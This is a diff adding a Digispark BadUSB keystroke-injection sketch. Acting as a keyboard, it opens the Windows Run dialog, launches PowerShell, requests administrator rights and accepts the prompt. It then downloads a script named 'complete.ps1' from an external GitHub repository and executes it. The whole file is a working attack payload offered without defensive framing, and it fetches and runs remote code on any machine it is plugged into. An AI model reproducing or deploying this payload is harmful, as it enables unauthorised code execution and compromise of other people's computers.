@@ -1,0 +1,16 @@
+#include "DigiKeyboard.h"
+#include "DigiKeyboardDe.h"
+void setup() {}
+void loop() 
+{
+  int d=500;
+  DigiKeyboard.sendKeyStroke(0);DigiKeyboard.delay(d);DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
+  DigiKeyboardDe.delay(d);DigiKeyboardDe.print("powershell.exe -version 4");DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);DigiKeyboardDe.print("Start-Process Powershell -Verb RunAS");DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);DigiKeyboard.sendKeyStroke(80);DigiKeyboard.delay(d);DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);DigiKeyboardDe.print("$client = new-object System.Net.WebClient");DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);DigiKeyboardDe.print("\$AllProtocols = \[System.Net.SecurityProtocolType\]\'Tls11,Tls12\'");DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);DigiKeyboardDe.print("\[System.Net.ServicePointManager\]::SecurityProtocol = $AllProtocols");DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);DigiKeyboardDe.print("$client.DownloadFile('https://github.com/flipthemouse/acquisition/raw/master/complete.ps1','C:complete.ps1')");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboardDe.print("C:\complete.ps1"); DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.delay(d); for (;;) {}
+}
